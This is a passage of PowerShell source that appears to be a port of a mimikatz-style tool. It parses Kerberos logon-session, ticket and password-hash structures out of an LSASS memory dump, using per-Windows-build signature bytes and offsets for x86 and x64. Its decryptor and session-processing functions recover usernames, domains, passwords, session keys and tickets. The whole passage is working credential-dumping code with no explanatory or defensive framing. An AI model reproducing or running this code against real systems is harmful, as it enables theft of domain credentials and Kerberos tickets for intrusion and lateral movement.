		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Description"]
		$StructToWrite["AltTargetDomainName"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["AltTargetDomainName"]
		$StructToWrite["KDCServer"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["KDCServer"]
		$StructToWrite["Unk10586_d"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Unk10586_d"]
		$StructToWrite["ClientName"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Name0"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Tmp = ReadBuff $Buff 4 ([ref]$Offset)
		[Array]::Reverse($Tmp)
		$StructToWrite["TicketFlags"] = [System.BitConverter]::ToUint32($Tmp, 0)
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk14393_0"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["KeyType"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Key"] = @{}
		KIWI_KERBEROS_BUFFER $Buff $StructToWrite["Key"] $BaseAddr ([ref]$Offset)
		$StructToWrite["Unk14393_1"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk3"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk4"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk5"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$Offset = AlignAddress $BaseAddr $Offset 8
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["StartTime"] = $Struct["Value"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["EndTime"] = $Struct["Value"]
		$Struct = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "FileTime" $Struct
		$StructToWrite["RenewUntil"] = $Struct["Value"]
		$StructToWrite["Unk6"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Unk7"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["Domain"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk8"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["StrangeNames"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk9"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["TicketEncType"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["TicketKvno"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Ticket"] = @{}
		KIWI_KERBEROS_BUFFER $Buff $StructToWrite["Ticket"] $BaseAddr ([ref]$Offset)

		return
	}

	function KERB_HASHPASSWORD_GENERIC($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Type"] = GetType $Buff $BaseAddr ([ref]$Offset) "DWord"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["Size"] = GetType $Buff $BaseAddr ([ref]$Offset) "Size_T"
		$StructToWrite["Checksump"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"

		return
	}

	function KERB_HASHPASSWORD_6($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Salt"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Salt"]
		$StructToWrite["StringToKey"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Generic"] = @{}
		KERB_HASHPASSWORD_GENERIC $Buff $StructToWrite ($BaseAddr + $Offset)

		return
	}

	function KERB_HASHPASSWORD_6_1607($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Salt"] = @{}
		GetType $Buff $BaseAddr ([ref]$Offset) "LSA_Unicode_String" $StructToWrite["Salt"]
		$StructToWrite["StringToKey"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Generic"] = @{}
		KERB_HASHPASSWORD_GENERIC $Buff $StructToWrite ($BaseAddr + $Offset)

		return
	}

	function KIWI_KERBEROS_KEYS_LIST_6($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["Unk0"] = GetType $Buff $BaseAddr ([ref]$Offset) "DWord"
		$StructToWrite["cbItem"] = GetType $Buff $BaseAddr ([ref]$Offset) "DWord"
		$StructToWrite["Unk1"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk2"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk3"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["Unk4"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["KeyEntries_Start"] = ($BaseAddr + $Offset)

		return
	}

	function KIWI_KERBEROS_ENUM_DATA_TICKET($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["IsTicketExport"] = GetType $Buff $BaseAddr ([ref]$Offset) "Bool"
		$StructToWrite["IsFullTicket"] = GetType $Buff $BaseAddr ([ref]$Offset) "Bool"

		return
	}

	function RTL_BALANCED_LINKS($Buff, $StructToWrite, $BaseAddr, [ref]$Offset)
	{
		$StructToWrite["Parent"] = GetType $Buff $BaseAddr $Offset "PVoid"
		$StructToWrite["LeftChild"] = GetType $Buff $BaseAddr $Offset "PVoid"
		$StructToWrite["RightChild"] = GetType $Buff $BaseAddr $Offset "PVoid"
		$StructToWrite["Balance"] = GetType $Buff $BaseAddr $Offset "Byte"
		$StructToWrite["Reserved"] = ReadBuff $Buff 3 $Offset
		$Offset.Value = AlignAddress $BaseAddr ($Offset.Value)

		return
	}

	function RTL_AVL_TABLE($Buff, $StructToWrite, $BaseAddr)
	{
		$Offset = 0
		$StructToWrite["BalancedRoot"] = @{}
		RTL_BALANCED_LINKS $Buff $StructToWrite["BalancedRoot"] $BaseAddr ([ref]$Offset)
		$StructToWrite["OrderedPointer"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["WhichOrderedElement"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["NumberGenericTableElements"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$StructToWrite["DepthOfTree"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["RestartKey"] = @{}
		RTL_BALANCED_LINKS $Buff $StructToWrite["RestartKey"] $BaseAddr ([ref]$Offset)
		$StructToWrite["DeleteCount"] = GetType $Buff $BaseAddr ([ref]$Offset) "ULong"
		$Offset = AlignAddress $BaseAddr $Offset
		$StructToWrite["CompareRoutine"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["AllocateRoutine"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["FreeRoutine"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"
		$StructToWrite["TableContext"] = GetType $Buff $BaseAddr ([ref]$Offset) "PVoid"

		return
	}

	If ($Dump["SysInfo"]["ProcessorArchitecture"] -eq $Global:PROCESSOR_ARCHITECTURE_INTEL)
	{
		# Processor x86
		If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
		{
			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
			return $Null
		}
		ElseIf (($Global:MINBUILD_WIN_VISTA -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_7))
		{
			$KerberosTemplate["Signature"] = @(0x53, 0x8b, 0x18, 0x50, 0x56)
			$KerberosTemplate["First_Entry_Offset"] = -11
			$KerberosTemplate["Kerberos_Session_Struct"] = (Get-Item "function:KIWI_KERBEROS_LOGON_SESSION").ScriptBlock
			$KerberosTemplate["Kerberos_Ticket_Struct"] = (Get-Item "function:KIWI_KERBEROS_INTERNAL_TICKET_60").ScriptBlock
			$KerberosTemplate["Keys_List_Struct"] = (Get-Item "function:KIWI_KERBEROS_KEYS_LIST_6").ScriptBlock
			$KerberosTemplate["Hash_Password_Struct"] = (Get-Item "function:KERB_HASHPASSWORD_6").ScriptBlock
			$KerberosTemplate["CSP_Info_Struct"] = (Get-Item "function:KIWI_KERBEROS_CSP_INFOS_60").ScriptBlock
		}
		ElseIf (($Global:MINBUILD_WIN_7 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_8))
		{
			$KerberosTemplate["Signature"] = @(0x53, 0x8b, 0x18, 0x50, 0x56)
			$KerberosTemplate["First_Entry_Offset"] = -11
			$KerberosTemplate["Kerberos_Session_Struct"] = (Get-Item "function:KIWI_KERBEROS_LOGON_SESSION").ScriptBlock
			$KerberosTemplate["Kerberos_Ticket_Struct"] = (Get-Item "function:KIWI_KERBEROS_INTERNAL_TICKET_6").ScriptBlock
			$KerberosTemplate["Keys_List_Struct"] = (Get-Item "function:KIWI_KERBEROS_KEYS_LIST_6").ScriptBlock
			$KerberosTemplate["Hash_Password_Struct"] = (Get-Item "function:KERB_HASHPASSWORD_6").ScriptBlock
			$KerberosTemplate["CSP_Info_Struct"] = (Get-Item "function:KIWI_KERBEROS_CSP_INFOS_60").ScriptBlock
		}
		ElseIf (($Global:MINBUILD_WIN_8 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_BLUE))
		{
			$KerberosTemplate["Signature"] = @(0x57, 0x8b, 0x38, 0x50, 0x68)
			$KerberosTemplate["First_Entry_Offset"] = -14
			$KerberosTemplate["Kerberos_Session_Struct"] = (Get-Item "function:KIWI_KERBEROS_LOGON_SESSION").ScriptBlock
			$KerberosTemplate["Kerberos_Ticket_Struct"] = (Get-Item "function:KIWI_KERBEROS_INTERNAL_TICKET_6").ScriptBlock
			$KerberosTemplate["Keys_List_Struct"] = (Get-Item "function:KIWI_KERBEROS_KEYS_LIST_6").ScriptBlock
			$KerberosTemplate["Hash_Password_Struct"] = (Get-Item "function:KERB_HASHPASSWORD_6").ScriptBlock
			$KerberosTemplate["CSP_Info_Struct"] = (Get-Item "function:KIWI_KERBEROS_CSP_INFOS_62").ScriptBlock
		}
		ElseIf (($Global:MINBUILD_WIN_BLUE -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:BUILD_WIN_10_1507))
		{
			$KerberosTemplate["Signature"] = @(0x56, 0x8b, 0x30, 0x50, 0x57)
			$KerberosTemplate["First_Entry_Offset"] = -15
			$KerberosTemplate["Kerberos_Session_Struct"] = (Get-Item "function:KIWI_KERBEROS_LOGON_SESSION").ScriptBlock
			$KerberosTemplate["Kerberos_Ticket_Struct"] = (Get-Item "function:KIWI_KERBEROS_INTERNAL_TICKET_6").ScriptBlock
			$KerberosTemplate["Keys_List_Struct"] = (Get-Item "function:KIWI_KERBEROS_KEYS_LIST_6").ScriptBlock
			$KerberosTemplate["Hash_Password_Struct"] = (Get-Item "function:KERB_HASHPASSWORD_6").ScriptBlock
			$KerberosTemplate["CSP_Info_Struct"] = (Get-Item "function:KIWI_KERBEROS_CSP_INFOS_62").ScriptBlock
		}
		ElseIf (($Global:BUILD_WIN_10_1507 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:BUILD_WIN_10_1511))
		{
			$KerberosTemplate["Signature"] = @(0x56, 0x8b, 0x30, 0x50, 0x57)
			$KerberosTemplate["First_Entry_Offset"] = -15
			$KerberosTemplate["Kerberos_Session_Struct"] = (Get-Item "function:KIWI_KERBEROS_LOGON_SESSION").ScriptBlock
			$KerberosTemplate["Kerberos_Ticket_Struct"] = (Get-Item "function:KIWI_KERBEROS_INTERNAL_TICKET_6").ScriptBlock
			$KerberosTemplate["Keys_List_Struct"] = (Get-Item "function:KIWI_KERBEROS_KEYS_LIST_6").ScriptBlock
			$KerberosTemplate["Hash_Password_Struct"] = (Get-Item "function:KERB_HASHPASSWORD_6").ScriptBlock
			$KerberosTemplate["CSP_Info_Struct"] = (Get-Item "function:KIWI_KERBEROS_CSP_INFOS_10").ScriptBlock
		}
		ElseIf (($Global:BUILD_WIN_10_1511 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:BUILD_WIN_10_1903))
		{
			$KerberosTemplate["Signature"] = @(0x56, 0x8b, 0x30, 0x50, 0x57)
			$KerberosTemplate["First_Entry_Offset"] = -15
			$KerberosTemplate["Kerberos_Session_Struct"] = (Get-Item "function:KIWI_KERBEROS_LOGON_SESSION_10_1607_X86").ScriptBlock
			$KerberosTemplate["Kerberos_Ticket_Struct"] = (Get-Item "function:KIWI_KERBEROS_INTERNAL_TICKET_10_1607").ScriptBlock
			$KerberosTemplate["Keys_List_Struct"] = (Get-Item "function:KIWI_KERBEROS_KEYS_LIST_6").ScriptBlock
			$KerberosTemplate["Hash_Password_Struct"] = (Get-Item "function:KERB_HASHPASSWORD_6_1607").ScriptBlock
			$KerberosTemplate["CSP_Info_Struct"] = (Get-Item "function:KIWI_KERBEROS_CSP_INFOS_10").ScriptBlock
		}
		Else
		{
			$KerberosTemplate["Signature"] = @(0x56, 0x8b, 0x30, 0x50, 0x53)
			$KerberosTemplate["First_Entry_Offset"] = -15
			$KerberosTemplate["Kerberos_Session_Struct"] = (Get-Item "function:KIWI_KERBEROS_LOGON_SESSION_10_1607_X86").ScriptBlock
			$KerberosTemplate["Kerberos_Ticket_Struct"] = (Get-Item "function:KIWI_KERBEROS_INTERNAL_TICKET_10_1607").ScriptBlock
			$KerberosTemplate["Keys_List_Struct"] = (Get-Item "function:KIWI_KERBEROS_KEYS_LIST_6").ScriptBlock
			$KerberosTemplate["Hash_Password_Struct"] = (Get-Item "function:KERB_HASHPASSWORD_6_1607").ScriptBlock
			$KerberosTemplate["CSP_Info_Struct"] = (Get-Item "function:KIWI_KERBEROS_CSP_INFOS_10").ScriptBlock
		}
	}
	ElseIf ($Dump["SysInfo"]["ProcessorArchitecture"] -eq $Global:PROCESSOR_ARCHITECTURE_AMD64)
	{
		# Processor x64
		If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
		{
			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
			return $Null
		}
		ElseIf (($Global:MINBUILD_WIN_VISTA -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_7))
		{
			$KerberosTemplate["Signature"] =@(0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d)
			$KerberosTemplate["First_Entry_Offset"] = 6
			$KerberosTemplate["Kerberos_Session_Struct"] = (Get-Item "function:KIWI_KERBEROS_LOGON_SESSION").ScriptBlock
			$KerberosTemplate["Kerberos_Ticket_Struct"] = (Get-Item "function:KIWI_KERBEROS_INTERNAL_TICKET_60").ScriptBlock
			$KerberosTemplate["Keys_List_Struct"] = (Get-Item "function:KIWI_KERBEROS_KEYS_LIST_6").ScriptBlock
			$KerberosTemplate["Hash_Password_Struct"] = (Get-Item "function:KERB_HASHPASSWORD_6").ScriptBlock
			$KerberosTemplate["CSP_Info_Struct"] = (Get-Item "function:KIWI_KERBEROS_CSP_INFOS_60").ScriptBlock
		}
		ElseIf (($Global:MINBUILD_WIN_7 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_8))
		{
			$KerberosTemplate["Signature"] = @(0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d)
			$KerberosTemplate["First_Entry_Offset"] = 6
			$KerberosTemplate["Kerberos_Session_Struct"] = (Get-Item "function:KIWI_KERBEROS_LOGON_SESSION").ScriptBlock
			$KerberosTemplate["Kerberos_Ticket_Struct"] = (Get-Item "function:KIWI_KERBEROS_INTERNAL_TICKET_6").ScriptBlock
			$KerberosTemplate["Keys_List_Struct"] = (Get-Item "function:KIWI_KERBEROS_KEYS_LIST_6").ScriptBlock
			$KerberosTemplate["Hash_Password_Struct"] = (Get-Item "function:KERB_HASHPASSWORD_6").ScriptBlock
			$KerberosTemplate["CSP_Info_Struct"] = (Get-Item "function:KIWI_KERBEROS_CSP_INFOS_60").ScriptBlock
		}
		ElseIf (($Global:MINBUILD_WIN_8 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:BUILD_WIN_10_1507))
		{
			$KerberosTemplate["Signature"] = @(0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d)
			$KerberosTemplate["First_Entry_Offset"] = 6
			$KerberosTemplate["Kerberos_Session_Struct"] = (Get-Item "function:KIWI_KERBEROS_LOGON_SESSION").ScriptBlock
			$KerberosTemplate["Kerberos_Ticket_Struct"] = (Get-Item "function:KIWI_KERBEROS_INTERNAL_TICKET_6").ScriptBlock
			$KerberosTemplate["Keys_List_Struct"] = (Get-Item "function:KIWI_KERBEROS_KEYS_LIST_6").ScriptBlock
			$KerberosTemplate["Hash_Password_Struct"] = (Get-Item "function:KERB_HASHPASSWORD_6").ScriptBlock
			$KerberosTemplate["CSP_Info_Struct"] = (Get-Item "function:KIWI_KERBEROS_CSP_INFOS_62").ScriptBlock
		}
		ElseIf (($Global:BUILD_WIN_10_1507 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:BUILD_WIN_10_1511))
		{
			$KerberosTemplate["Signature"] = @(0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d)
			$KerberosTemplate["First_Entry_Offset"] = 6
			$KerberosTemplate["Kerberos_Session_Struct"] = (Get-Item "function:KIWI_KERBEROS_LOGON_SESSION_10").ScriptBlock
			$KerberosTemplate["Kerberos_Ticket_Struct"] = (Get-Item "function:KIWI_KERBEROS_INTERNAL_TICKET_6").ScriptBlock
			$KerberosTemplate["Keys_List_Struct"] = (Get-Item "function:KIWI_KERBEROS_KEYS_LIST_6").ScriptBlock
			$KerberosTemplate["Hash_Password_Struct"] = (Get-Item "function:KERB_HASHPASSWORD_6").ScriptBlock
			$KerberosTemplate["CSP_Info_Struct"] = (Get-Item "function:KIWI_KERBEROS_CSP_INFOS_10").ScriptBlock
		}
		ElseIf (($Global:BUILD_WIN_10_1511 -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:BUILD_WIN_10_1607))
		{
			$KerberosTemplate["Signature"] = @(0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d)
			$KerberosTemplate["First_Entry_Offset"] = 6
			$KerberosTemplate["Kerberos_Session_Struct"] = (Get-Item "function:KIWI_KERBEROS_LOGON_SESSION_10").ScriptBlock
			$KerberosTemplate["Kerberos_Ticket_Struct"] = (Get-Item "function:KIWI_KERBEROS_INTERNAL_TICKET_10").ScriptBlock
			$KerberosTemplate["Keys_List_Struct"] = (Get-Item "function:KIWI_KERBEROS_KEYS_LIST_6").ScriptBlock
			$KerberosTemplate["Hash_Password_Struct"] = (Get-Item "function:KERB_HASHPASSWORD_6").ScriptBlock
			$KerberosTemplate["CSP_Info_Struct"] = (Get-Item "function:KIWI_KERBEROS_CSP_INFOS_10").ScriptBlock
		}
		Else
		{
			$KerberosTemplate["Signature"] = @(0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d)
			$KerberosTemplate["First_Entry_Offset"] = 6
			$KerberosTemplate["Kerberos_Session_Struct"] = (Get-Item "function:KIWI_KERBEROS_LOGON_SESSION_10_1607").ScriptBlock
			$KerberosTemplate["Kerberos_Ticket_Struct"] = (Get-Item "function:KIWI_KERBEROS_INTERNAL_TICKET_10_1607").ScriptBlock
			$KerberosTemplate["Keys_List_Struct"] = (Get-Item "function:KIWI_KERBEROS_KEYS_LIST_6").ScriptBlock
			$KerberosTemplate["Hash_Password_Struct"] = (Get-Item "function:KERB_HASHPASSWORD_6_1607").ScriptBlock
			$KerberosTemplate["CSP_Info_Struct"] = (Get-Item "function:KIWI_KERBEROS_CSP_INFOS_10").ScriptBlock
		}
	}

	<### Kerberos Decryptor ###>

	$KerberosDecryptor = @{}
	$KerberosDecryptor["Decryptor_Template"] = $KerberosTemplate
	$KerberosDecryptor["LSA_Decryptor"] = $LSADecryptor
	$KerberosDecryptor["BuildNumber"] = $Dump["SysInfo"]["BuildNumber"]
	$KerberosDecryptor["Credentials"] = @()
	$KerberosDecryptor["CurrentCred"] = $Null
	$KerberosDecryptor["Current_Ticket_Type"] = $Null

	<### Functions ###>

	# Callback functions
	# Use same signature : $KerberosDecryptor, $Handle, $Pages, $Entry, $EntryAddr
	function Handle-Ticket($KerberosDecryptor, $Handle, $Pages, $Entry, $EntryAddr)
	{
		# Not tested

		<#
		$KerberosTicket["ServiceName"] = $Null
		$KerberosTicket["ServiceName_Type"] = $Null
		$KerberosTicket["DomainName"] = $Null
		$KerberosTicket["ETargetName"] = $Null
		$KerberosTicket["ETargetName_type"] = $Null
		$KerberosTicket["TargetDomainName"] = $Null
		$KerberosTicket["EClientName"] = $Null
		$KerberosTicket["EClientName_type"] = $Null
		$KerberosTicket["AltTargetDomainName"] = $Null
		$KerberosTicket["Description"] = $Null
		$KerberosTicket["StartTime"] = $Null
		$KerberosTicket["EndTime"] = $Null
		$KerberosTicket["RenewUntil"] = $Null
		$KerberosTicket["KeyType"] = $Null
		$KerberosTicket["Key"] = $Null
		$KerberosTicket["TicketFlags"] = $Null
		$KerberosTicket["TicketEncType"] = $Null
		$KerberosTicket["TicketKvno"] = $Null
		$KerberosTicket["Ticket"] = $Null
		$KerberosTicket["Kirbi_Data"] = @{}
		$KerberosTicket["Session_Key"] = $Null

		$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages $Entry["ServiceName"]
		If ($Buff)
		{
			$Buff = $Buff[$OffAddr..($Buff.Length - 1)]
			$BaseAddr += $OffAddr
			$KERB_EXTERNAL_NAME = @{}
			KERB_EXTERNAL_NAME $Buff $KERB_EXTERNAL_NAME $BaseAddr
			$KerberosTicket["ServiceName"] = $KERB_EXTERNAL_NAME
			$KerberosTicket["ServiceName_Type"] = $KERB_EXTERNAL_NAME["NameType"]
		}

		$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages $Entry["DomainName"]["Buffer"]
		If ($Buff)
		{
			If ($Entry["DomainName"]["Length"] -gt 0)
			{
				$Buff = $Buff[$OffAddr..($OffAddr + $Entry["DomainName"]["Length"] - 1)]
				$KerberosTicket["DomainName"] = [System.Text.Encoding]::Unicode.GetString($Buff)
			}
		}

		If ($Entry["TargetName"] -ne 0)
		{
			$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages $Entry["TargetName"]
			If ($Buff)
			{
				$Buff = $Buff[$OffAddr..($Buff.Length - 1)]
				$BaseAddr += $OffAddr
				$KERB_EXTERNAL_NAME = @{}
				KERB_EXTERNAL_NAME $Buff $KERB_EXTERNAL_NAME $BaseAddr
				$KerberosTicket["ETargetName"] = $KERB_EXTERNAL_NAME
				$KerberosTicket["ETargetName_Type"] = $KERB_EXTERNAL_NAME["NameType"]
			}
		}

		$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages $Entry["TargetDomainName"]["Buffer"]
		If ($Buff)
		{
			If ($Entry["TargetDomainName"]["Length"] -gt 0)
			{
				$Buff = $Buff[$OffAddr..($OffAddr + $Entry["TargetDomainName"]["Length"] - 1)]
				$KerberosTicket["TargetDomainName"] = [System.Text.Encoding]::Unicode.GetString($Buff)
			}
		}

		$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages $Entry["ClientName"]
		If ($Buff)
		{
			$Buff = $Buff[$OffAddr..($Buff.Length - 1)]
			$BaseAddr += $OffAddr
			$KERB_EXTERNAL_NAME = @{}
			KERB_EXTERNAL_NAME $Buff $KERB_EXTERNAL_NAME $BaseAddr
			$KerberosTicket["EClientName"] = $KERB_EXTERNAL_NAME
			$KerberosTicket["EClientName_Type"] = $KERB_EXTERNAL_NAME["NameType"]
		}

		$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages $Entry["AltTargetDomainName"]["Buffer"]
		If ($Buff)
		{
			If ($Entry["AltTargetDomainName"]["Length"] -gt 0)
			{
				$Buff = $Buff[$OffAddr..($OffAddr + $Entry["AltTargetDomainName"]["Length"] - 1)]
				$KerberosTicket["AltTargetDomainName"] = [System.Text.Encoding]::Unicode.GetString($Buff)
			}
		}

		$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages $Entry["Description"]["Buffer"]
		If ($Buff)
		{
			If ($Entry["Description"]["Length"] -gt 0)
			{
				$Buff = $Buff[$OffAddr..($OffAddr + $Entry["Description"]["Length"] - 1)]
				$KerberosTicket["Description"] = [System.Text.Encoding]::Unicode.GetString($Buff)
			}
		}

		# Convert UNIX timestamp to Windows Filetime
		$EPOCH_AS_FILETIME = 116444736000000000
		$HUNDREDS_OF_NANOSECONDS = 10000000
		$KerberosTicket["StartTime"] = (Get-Date 01.01.1970)+([System.TimeSpan]::fromseconds(($Entry["StartTime"] - $EPOCH_AS_FILETIME) / $HUNDREDS_OF_NANOSECONDS))
		$KerberosTicket["EndTime"] = (Get-Date 01.01.1970)+([System.TimeSpan]::fromseconds(($Entry["EndTime"] - $EPOCH_AS_FILETIME) / $HUNDREDS_OF_NANOSECONDS))
		If ($Entry["RenewUntil"] -ne 0)
		{
			$KerberosTicket["RenewUntil"] = (Get-Date 01.01.1970)+([System.TimeSpan]::fromseconds(($Entry["RenewUntil"] - $EPOCH_AS_FILETIME) / $HUNDREDS_OF_NANOSECONDS))
		}
		Else { $KerberosTicket["RenewUntil"] = Get-Date 01.01.1970 }

		$KerberosTicket["KeyType"] = $Entry["KeyType"]
		$KerberosTicket["Key"] = $Entry["Key"]
		$KerberosSessionKey = @{}
		$KerberosSessionKey["KeyData"] = $KerberosTicket["Key"]["Data"]
		If (($KerbersDecryptor["BuildNumber"] -lt $Global:BUILD_WIN_10_1507) -or ($KerberosTicket["Key"]["Length"] -lt $Global:LSAISO_DATA_BLOB_SIZE))
		{
			$KerberosSessionKey["SessionKey"] = $KerberosSessionKey["KeyData"]
		}
		Else
		{
			If ($KerberosTicket["Key"]["Length"] -lt ($Global:LSAISO_DATA_BLOB_SIZE + ("KerberosKey".Length) - 1 + 32))
			{
				$Blob = @{}
				LSAISO_DATA_BLOB $KerberosSessionKey["KeyData"] $Blob 0
			}
			Else
			{
				$Blob = @{}
				ENC_LSAISO_DATA_BLOB $KerberosSessionKey["KeyData"] $Blob 0
			}

			$KerberosSessionKey["SessionKey"] = $Blob["Data"]
		}
		$KerberosTicket["SessionKey"] = $KerberosSessionKey

		$KerberosTicket["TicketFlags"] = $Entry["TicketFlags"]
		$KerberosTicket["TicketEncType"] = $Entry["TicketEncType"]
		$KerberosTicket["TicketKvno"] = $Entry["TicketKvno"]
		$KerberosTicket["Ticket"] = $Entry["Ticket"]

		$KerberosDecryptor["CurrentCred"]["Tickets"] += ,($KerberosTicket)
		#>

		return
	}

	function Process-Session($KerberosDecryptor, $Handle, $Pages, $Entry)
	{
		$KerberosCredential = @{}
		$KerberosCredential["CredType"] = "Kerberos"
		$KerberosCredential["UserName"] = $Null
		$KerberosCredential["Domain"] = $Null
		$KerberosCredential["Password"] = $Null
		$KerberosCredential["LUID"] = $Null
		$KerberosCredential["Tickets"] = @()
		$KerberosCredential["PIN"] = $Null
		$KerberosCredential["CardInfo"] = $Null

		$KerberosCredential["LUID"] = $Entry["LocallyUniqueIdentifier"]

		$KerberosCredential["UserName"] = ""
		If (($Entry["Credentials"]["UserName"]["Buffer"] -ne 0) -and ($Entry["Credentials"]["UserName"]["Length"] -gt 0))
		{
			$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages ($Entry["Credentials"]["UserName"]["Buffer"])
			If ($Buff)
			{
				If ($Entry["Credentials"]["UserName"]["Length"] -gt 0)
				{
					$Buff = $Buff[$OffAddr..($OffAddr + $Entry["Credentials"]["UserName"]["Length"] - 1)]
					$KerberosCredential["UserName"] = [System.Text.Encoding]::Unicode.GetString($Buff)
				}
			}
		}

		$KerberosCredential["Domain"] = ""
		If (($Entry["Credentials"]["Domain"]["Buffer"] -ne 0) -and ($Entry["Credentials"]["Domain"]["Length"] -gt 0))
		{
			$Buff, $OffAddr, $BaseAddr = ReadMemory $Handle $Pages ($Entry["Credentials"]["Domain"]["Buffer"])
			If ($Buff)
			{
				If ($Entry["Credentials"]["Domain"]["Length"] -gt 0)
				{
					$Buff = $Buff[$OffAddr..($OffAddr + $Entry["Credentials"]["Domain"]["Length"] - 1)]
					$KerberosCredential["Domain"] = [System.Text.Encoding]::Unicode.GetString($Buff)
				}
			}
		}

		$KerberosCredential["Password"] = @()
